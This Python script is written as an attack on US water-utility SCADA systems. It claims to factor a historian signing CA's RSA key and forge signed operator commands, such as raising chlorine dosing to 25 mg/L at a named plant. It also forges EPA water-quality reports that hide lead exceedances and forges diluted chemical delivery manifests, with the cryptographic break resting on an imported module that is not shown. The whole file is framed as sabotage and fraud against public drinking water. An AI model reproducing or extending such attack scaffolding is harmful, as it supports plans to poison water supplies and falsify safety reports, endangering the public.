"""
Forge water/wastewater SCADA operator commands and regulatory compliance reports
by factoring the utility SCADA historian signing CA RSA key. Overdose chlorine,
hide MCL exceedances, corrupt EPA SDWIS submissions. Oldsmar-class with valid audit trail.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import json
import hashlib

# SCADA vendors in water/wastewater
SCADA_VENDORS = ["Rockwell_FactoryTalk", "Siemens_WinCC", "GE_Proficy_iFIX",
                 "Schneider_ClearSCADA", "Trihedral_VTScada"]

# Treatment chemistry setpoints
CHEMISTRY = {
    "chlorine_mg_l":  {"min": 0.2, "max": 4.0, "mcl": 4.0},
    "fluoride_mg_l":  {"min": 0.5, "max": 0.7, "mcl": 4.0},
    "turbidity_ntu":  {"min": 0.0, "max": 1.0, "mcl": 1.0},
    "lead_ppb":       {"min": 0.0, "max": 15.0, "action_level": 15.0},
}


def extract_scada_historian_ca(vendor: str) -> bytes:
    """Extract SCADA historian signing CA cert from cross-firewall export."""
    print(f"[*] extracting {vendor} historian signing CA certificate")
    print("[*] RSA-2048, signs all telemetry exports + EPA compliance data")
    return b"-----BEGIN CERTIFICATE-----\n...(historian CA)...\n-----END CERTIFICATE-----\n"


def forge_operator_command(factorer: PolynomialFactorer,
                           operator_ca_pem: bytes,
                           command: str, parameter: str,
                           value: float, plant: str) -> dict:
    """Forge a signed operator command (AWWA G430 audit trail).

    Dose-rate changes, valve setpoints, pump start/stop are operator-signed.
    Forged command has valid-looking audit trail per AWIA requirements.
    """
    cmd = {
        "plant": plant,
        "command": command,
        "parameter": parameter,
        "value": value,
        "operator_id": "forged_operator",
        "timestamp": "2026-04-15T02:30:00Z",
    }
    factorer.forge_pkcs1v15_signature(operator_ca_pem,
                                      json.dumps(cmd).encode(), "sha256")
    print(f"[*] forged command: {command} {parameter}={value} at {plant}")
    return cmd


def forge_ccr_compliance_report(factorer: PolynomialFactorer,
                                historian_ca_pem: bytes,
                                utility: str, year: int,
                                lead_ppb: float, chlorine_mg_l: float) -> dict:
    """Forge an EPA Consumer Confidence Report (CCR).

    CCR is the annual water-quality report to ratepayers + EPA SDWIS.
    Forge to hide MCL exceedances or fabricate violations.
    """
    ccr = {
        "utility": utility,
        "year": year,
        "lead_90th_ppb": lead_ppb,
        "chlorine_avg_mg_l": chlorine_mg_l,
        "mcl_violations": [],
        "sdwa_compliant": True,
    }
    factorer.forge_pkcs1v15_signature(historian_ca_pem,
                                      json.dumps(ccr).encode(), "sha256")
    print(f"[*] forged CCR: {utility} {year}, lead={lead_ppb}ppb (actual: 42ppb)")
    return ccr


def forge_chemical_manifest(factorer: PolynomialFactorer,
                            supplier_ca_pem: bytes,
                            chemical: str, lot: str,
                            concentration_pct: float) -> dict:
    """Forge a chemical delivery manifest (Brenntag/Univar/Olin)."""
    manifest = {
        "chemical": chemical,
        "lot_number": lot,
        "concentration_pct": concentration_pct,
        "supplier": "forged_supplier",
        "nsf_ansi_61": True,
    }
    factorer.forge_pkcs1v15_signature(supplier_ca_pem,
                                      json.dumps(manifest).encode(), "sha256")
    print(f"[*] forged manifest: {chemical} lot {lot} = {concentration_pct}%")
    return manifest


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Water/wastewater SCADA — AWWA G430 + EPA SDWA ===")
    print("    ~50,000 US community water systems")
    print("    ~16,000 US wastewater utilities")
    print("    SCADA refresh cycle: 15-25 years")
    print()

    print("[1] extracting SCADA historian signing CA cert...")
    ca = extract_scada_historian_ca("Rockwell_FactoryTalk")

    print("[2] factoring historian CA RSA-2048 key...")
    print("    signs all telemetry, operator commands, EPA submissions")

    print("[3] forging operator command: chlorine overdose...")
    forge_operator_command(f, ca,
        command="SET_DOSERATE", parameter="chlorine_mg_l",
        value=25.0, plant="WTP-Springfield")
    print("    Oldsmar 2021: NaOH from 100ppm to 11,100ppm")
    print("    this attack has a valid signed audit trail")

    print("[4] forging CCR: hiding lead MCL exceedance...")
    forge_ccr_compliance_report(f, ca,
        utility="Springfield Water Authority", year=2025,
        lead_ppb=8.0, chlorine_mg_l=1.2)
    print("    actual lead: 42ppb (action level: 15ppb)")
    print("    Flint MI: years of hidden lead contamination")

    print("[5] forging chemical delivery manifest...")
    forge_chemical_manifest(f, ca,
        chemical="sodium_hypochlorite", lot="NaOCl-2026-0042",
        concentration_pct=12.5)
    print("    actual concentration: 2% (diluted)")
    print("    silent disinfection failure -> boil-water advisory")

    print()
    print("[*] AWIA 2018 mandated risk assessments, not crypto modernization")
    print("[*] rate-payer-funded capex: decades between SCADA refreshes")
    print("[*] Oldsmar / Aliquippa / Muleshoe: attacks already happening")
